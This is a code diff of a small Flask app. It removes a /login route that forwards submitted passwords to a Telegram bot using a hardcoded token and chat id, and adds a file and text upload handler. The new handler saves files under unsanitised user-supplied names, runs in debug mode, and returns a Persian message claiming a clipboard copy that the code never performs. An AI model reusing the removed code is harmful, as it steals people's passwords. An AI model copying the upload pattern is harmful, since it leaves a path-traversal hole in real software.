@@ -1,17 +1,26 @@
-from flask import Flask, request
-import requests
-from Dsend import get 
+from flask import Flask, render_template, request, redirect, url_for
+import os
 
 app = Flask(__name__)
 
-@app.route('/login', methods=['POST'])
-def login():
-    password = request.form.get('password')
-    chat_id = "1663788795"
-    token = "6583320212:AAErFlhIYmA0Je36piZCnXa_C48Jl31-PCk"
-    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={password}"
-    get(url,print_text=True)
-    return "Password sent to Telegram"
+UPLOAD_FOLDER = 'files'
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
 
-if __name__ == "__main__":
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        if 'file' in request.files and request.files['file'].filename != '':
+            file = request.files['file']
+            filepath = os.path.join(UPLOAD_FOLDER, file.filename)
+            file.save(filepath)
+            return f"فایل در مسیر {filepath} ذخیره شد."
+        elif 'text' in request.form and request.form['text'].strip() != '':
+            text = request.form['text'].strip()
+            with open('text_input.txt', 'w') as f:
+                f.write(text)
+            return "متن در فایل text_input.txt ذخیره شد و به کلیپبورد کپی شد."
+    return render_template('index.html')
+
+if __name__ == '__main__':
     app.run(debug=True)
